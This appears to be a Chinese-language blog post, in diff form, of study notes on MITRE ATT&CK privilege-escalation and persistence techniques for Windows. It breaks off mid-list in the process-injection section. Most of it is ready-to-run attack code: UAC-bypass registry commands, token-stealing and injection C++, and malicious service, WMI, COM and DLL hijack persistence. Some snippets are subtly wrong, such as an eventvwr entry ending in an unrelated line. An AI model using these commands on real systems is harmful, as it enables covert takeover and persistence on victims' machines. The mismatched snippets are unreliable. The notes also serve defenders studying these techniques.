@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-tw" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>烏鴉囈語 | 烏鴉囈語</title><meta name="author" content="烏鴉先生"><meta name="copyright" content="烏鴉先生"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="濫用權限提升控制機制 (Abuse Elevation Control Mechanism)UAC繞過技術：    方法 原理/說明 實作步驟    fodhelper.exe 利用自動提升權限特性    123reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="烏鴉囈語">
+<meta property="og:url" content="http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/index.html">
+<meta property="og:site_name" content="烏鴉囈語">
+<meta property="og:description" content="濫用權限提升控制機制 (Abuse Elevation Control Mechanism)UAC繞過技術：    方法 原理/說明 實作步驟    fodhelper.exe 利用自動提升權限特性    123reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="http://withoutdirection.github.io/img/crow.webp">
+<meta property="article:published_time" content="2025-07-28T02:21:36.368Z">
+<meta property="article:modified_time" content="2025-07-28T02:22:59.539Z">
+<meta property="article:author" content="烏鴉先生">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://withoutdirection.github.io/img/crow.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/",
+  "image": "http://withoutdirection.github.io/img/crow.webp",
+  "datePublished": "2025-07-28T02:21:36.368Z",
+  "dateModified": "2025-07-28T02:22:59.539Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "烏鴉先生",
+      "url": "https://withoutdirection.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const hour = new Date().getHours()
+          const isNight = hour <= 6 || hour >= 17
+          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else theme === 'light' ? activateLightMode() : activateDarkMode()
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '烏鴉囈語',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="烏鴉囈語" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(img/forest.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/crow.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 檔案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: 縮略圖;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.webp" alt="Logo"><span class="site-name">烏鴉囈語</span></a><a class="nav-page-title" href="/"><span class="site-name">烏鴉囈語</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 檔案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Untitled</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-28T02:21:36.368Z" title="Created 2025-07-28 10:21:36">2025-07-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-28T02:22:59.539Z" title="Updated 2025-07-28 10:22:59">2025-07-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(undefined);"></div><article class="container post-content" id="article-container"><h4 id="濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism"><a href="#濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism" class="headerlink" title="濫用權限提升控制機制 (Abuse Elevation Control Mechanism)"></a>濫用權限提升控制機制 (Abuse Elevation Control Mechanism)</h4><p><strong>UAC繞過技術：</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>原理/說明</th>
+<th>實作步驟</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>fodhelper.exe</td>
+<td>利用自動提升權限特性</td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">fodhelper.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>| eventvwr.exe | 登錄檔劫持 | </p>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">    $env:<span class="built_in">PATH</span> -split ';' | ForEach-Object { <span class="keyword">if</span> (Test-<span class="built_in">Path</span> $_) { Get-ChildItem $_ -File -Filter "*.dll" } }</span><br></pre></td></tr></tbody></table></figure>
+<p>| sdclt.exe | 利用 isolation 功能 | </p>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\exefile\shell\runas\command" /ve /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v "IsolatedCommand" /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">sdclt.exe /KickOffElev</span><br></pre></td></tr></tbody></table></figure>
+<p>| ComputerDefaults.exe | 利用自動提升權限 | </p>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "powershell.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">ComputerDefaults.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>| COM 提升標識符 | PowerShell 建立 COM 物件 | </p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> <span class="string">"Elevation:1!new:{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</span></span><br><span class="line"><span class="variable">$com</span>.ExecuteCommand(<span class="string">"cmd.exe"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h4 id="存取權杖操控-Access-Token-Manipulation"><a href="#存取權杖操控-Access-Token-Manipulation" class="headerlink" title="存取權杖操控 (Access Token Manipulation)"></a>存取權杖操控 (Access Token Manipulation)</h4><p><strong>常見技術與範例：</strong></p>
+<ul>
+<li>權杖模擬/竊取  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 開啟目標處理程序</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, dwPID);</span><br><span class="line"><span class="comment">// 開啟處理程序權杖</span></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &amp;hToken);</span><br><span class="line"><span class="comment">// 複製權杖</span></span><br><span class="line">HANDLE hDupToken;</span><br><span class="line"><span class="built_in">DuplicateToken</span>(hToken, SecurityImpersonation, &amp;hDupToken);</span><br><span class="line"><span class="comment">// 模擬權杖</span></span><br><span class="line"><span class="built_in">ImpersonateLoggedOnUser</span>(hDupToken);</span><br><span class="line"><span class="comment">// 使用權杖建立處理程序</span></span><br><span class="line"><span class="built_in">CreateProcessWithTokenW</span>(hDupToken, <span class="number">0</span>, <span class="string">L"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></tbody></table></figure></li>
+<li>Named Pipe 模擬  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hPipe = <span class="built_in">CreateNamedPipe</span>(<span class="string">L"\\.\\pipe\\test"</span>, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ConnectNamedPipe</span>(hPipe, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ImpersonateNamedPipeClient</span>(hPipe);</span><br></pre></td></tr></tbody></table></figure></li>
+<li>SeDebugPrivilege 提升  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
+<li>SeImpersonatePrivilege 濫用（Potato 攻擊）  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立 BITS 作業觸發 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 使用 COM 介面攔截 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 透過 Named Pipe 或 RPC 進行權杖竊取</span></span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution"><a href="#開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution" class="headerlink" title="開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)"></a>開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)</h4><p><strong>常見登錄檔位置：</strong></p>
+<table>
+<thead>
+<tr>
+<th>層級</th>
+<th>路徑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系統</td>
+<td><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td>
+</tr>
+<tr>
+<td>使用者</td>
+<td><code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td>
+</tr>
+</tbody></table>
+<p><strong>Winlogon 協助程式機碼：</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line">...（略）</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>LSA 安全性套件註冊：</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages</span><br><span class="line">...（略）</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>範例：</strong></p>
+<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">SpLsaModeInitialize</span><span class="params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span> </span>{</span><br><span class="line">    <span class="comment">// 攔截認證資訊</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h4 id="建立或修改系統處理程序-Create-or-Modify-System-Process"><a href="#建立或修改系統處理程序-Create-or-Modify-System-Process" class="headerlink" title="建立或修改系統處理程序 (Create or Modify System Process)"></a>建立或修改系統處理程序 (Create or Modify System Process)</h4><ul>
+<li><strong>Windows 服務建立/劫持</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SC_HANDLE schSCManager = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">SC_HANDLE schService = <span class="built_in">CreateService</span>(schSCManager, <span class="string">L"MaliciousService"</span>, <span class="string">L"Legitimate Service"</span>, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, <span class="string">L"C:\malicious.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">StartService</span>(schService, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>服務 DLL 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Services\[服務名稱]\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\malicious.dll" /f</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>WMI 服務註冊</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$service</span> = ([<span class="type">wmiclass</span>]<span class="string">"Win32_BaseService"</span>).CreateInstance()</span><br><span class="line"><span class="variable">$service</span>.Name = <span class="string">"MaliciousWMIService"</span></span><br><span class="line"><span class="variable">$service</span>.DisplayName = <span class="string">"Legitimate WMI Service"</span></span><br><span class="line"><span class="variable">$service</span>.PathName = <span class="string">"C:\malicious.exe"</span></span><br><span class="line"><span class="variable">$service</span>.ServiceType = [<span class="type">uint32</span>]<span class="number">16</span></span><br><span class="line"><span class="variable">$service</span>.StartMode = <span class="string">"Auto"</span></span><br><span class="line"><span class="variable">$service</span>.Put()</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="事件觸發執行-Event-Triggered-Execution"><a href="#事件觸發執行-Event-Triggered-Execution" class="headerlink" title="事件觸發執行 (Event Triggered Execution)"></a>事件觸發執行 (Event Triggered Execution)</h4><ul>
+<li><strong>WMI 事件訂閱</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ Name = <span class="string">"MaliciousFilter"</span>; EventNameSpace = <span class="string">"root\cimv2"</span>; QueryLanguage = <span class="string">"WQL"</span>; Query = <span class="string">"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"</span> }</span><br><span class="line"><span class="variable">$EventConsumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ Name = <span class="string">"MaliciousConsumer"</span>; CommandLineTemplate = <span class="string">"powershell.exe -enc [Base64編碼的PowerShell命令]"</span> }</span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ <span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>; Consumer = <span class="variable">$EventConsumer</span> }</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>預設檔案關聯修改</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt\OpenWithProgids" /v "malicious_auto_file" /t REG_NONE /f</span><br><span class="line">reg add "HKCU\Software\Classes\malicious_auto_file\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe %<span class="number">1</span>" /f</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>螢幕保護程式劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\malicious.scr" /f</span><br><span class="line">reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "<span class="number">1</span>" /f</span><br><span class="line">reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeout" /t REG_SZ /d "<span class="number">60</span>" /f</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>Netsh 協助程式 DLL</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper C:\malicious.dll</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="劫持執行流程-Hijack-Execution-Flow"><a href="#劫持執行流程-Hijack-Execution-Flow" class="headerlink" title="劫持執行流程 (Hijack Execution Flow)"></a>劫持執行流程 (Hijack Execution Flow)</h4><ul>
+<li><strong>DLL 搜尋順序劫持</strong><ol>
+<li>應用程式載入目錄</li>
+<li>系統目錄 (System32)</li>
+<li>16位元系統目錄 (System)</li>
+<li>Windows 目錄</li>
+<li>當前目錄</li>
+<li>PATH 環境變數目錄</li>
+</ol>
+</li>
+<li><strong>DLL 代理技術</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">"/EXPORT:FunctionName=OriginalDLL.FunctionName,@1"</span>)</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) {</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, MaliciousThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>COM 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f</span><br><span class="line">reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>COR_PROFILER 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> COR_ENABLE_PROFILING=<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> COR_PROFILER={CLSID}</span><br><span class="line"><span class="built_in">set</span> COR_PROFILER_PATH=C:\malicious.dll</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>KernelCallbackTable 劫持</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PPEB pPeb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PVOID* pKernelCallbackTable = (PVOID*)pPeb-&gt;KernelCallbackTable;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pKernelCallbackTable, <span class="built_in">sizeof</span>(PVOID) * <span class="number">1024</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">pKernelCallbackTable[<span class="number">0</span>] = (PVOID)MaliciousCallback;</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="處理程序注入-Process-Injection"><a href="#處理程序注入-Process-Injection" class="headerlink" title="處理程序注入 (Process Injection)"></a>處理程序注入 (Process Injection)</h4><ul>
+<li><strong>手動 DLL 對應</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pImageBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pImageBase, pDllBuffer, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)((DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
